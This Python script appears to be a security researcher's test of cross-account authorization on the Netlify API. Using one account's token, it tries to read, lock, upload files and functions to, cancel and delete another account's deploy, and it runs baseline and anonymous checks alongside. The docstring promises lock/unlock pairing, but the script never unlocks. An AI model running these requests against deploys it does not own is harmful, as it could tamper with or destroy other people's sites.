# -*- coding: utf-8 -*-
"""deploy_id 族跨账号矩阵: B token 操作 A 的公开 deploy
先假 id 基线, 再真实 id; 副作用操作(lock/unlock)立即成对
"""
import http.client, ssl, gzip, brotli, json, sys, random
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, TOKEN_B

DID = '6a97c9e3083c963fd210b895'   # A 站当前 ready deploy(公开 URL)
FAKE = '6a97c9e3083c963fd210b999'   # 不存在
ctx = ssl.create_default_context()

def req(method, path, body=None, token=None, timeout=25):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json'}
    if token: h['Authorization'] = 'Bearer ' + token
    b = json.dumps(body).encode() if body is not None else None
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    st = r.status
    txt = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, txt

def probe(tag, m, p, body=None, tok=None):
    st, b = req(m, p, body, tok)
    print('%-46s %s | %s' % (tag, st, b[:120].replace('\n', ' ')))
    return st, b

print('== 0. 公开 URL 可达性确认 ==')
conn = http.client.HTTPSConnection('6a97c9e3083c963fd210b895--sec-test-rcf6lz.netlify.app', context=ctx, timeout=15)
conn.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0'})
r = conn.getresponse()
print('public deploy URL:', r.status, r.read()[:80])
conn.close()
print()

print('== 1. 假 id × B token(404 基线)==')
for m, p in [('GET', '/deploys/%s' % FAKE), ('POST', '/deploys/%s/lock' % FAKE),
             ('PUT', '/deploys/%s/files/x.txt' % FAKE), ('DELETE', '/deploys/%s' % FAKE),
             ('PATCH', '/deploys/%s/validations_report' % FAKE)]:
    probe('B fake %s %s' % (m, p.split('/')[2]), m, p, {'a': 1}, TOKEN_B)

print()
print('== 2. 真实 id × B token(跨账号核心)==')
probe('B GET A-deploy', 'GET', '/deploys/%s' % DID, None, TOKEN_B)
probe('B lock A-deploy', 'POST', '/deploys/%s/lock' % DID, None, TOKEN_B)
probe('B PUT files/x.txt', 'PUT', '/deploys/%s/files/zzz-%d.txt' % (DID, random.randint(1000, 9999)), b'pwn-test', TOKEN_B)
probe('B PUT functions/f', 'PUT', '/deploys/%s/functions/zzfn' % DID, b'export default 1', TOKEN_B)
probe('B PUT edge_functions', 'PUT', '/deploys/%s/edge_functions/zzsha' % DID, b'{}', TOKEN_B)
probe('B cancel A-deploy', 'POST', '/deploys/%s/cancel' % DID, None, TOKEN_B)
probe('B PATCH validations', 'PATCH', '/deploys/%s/validations_report' % DID, {'a': 1}, TOKEN_B)
probe('B DELETE A-deploy', 'DELETE', '/deploys/%s' % DID, None, TOKEN_B)

print()
print('== 3. 真实 id × A token(基线对照)==')
probe('A GET own', 'GET', '/deploys/%s' % DID, None, TOKEN_A)
probe('A PUT files/x.txt 基线', 'PUT', '/deploys/%s/files/zzz-base-%d.txt' % (DID, random.randint(1000, 9999)),
      b'base', TOKEN_A)
probe('A PATCH validations', 'PATCH', '/deploys/%s/validations_report' % DID, {'a': 1}, TOKEN_A)

print()
print('== 4. 匿名 ==')
probe('anon GET deploy', 'GET', '/deploys/%s' % DID, None, None)
probe('anon lock deploy', 'POST', '/deploys/%s/lock' % DID, None, None)
print('done')
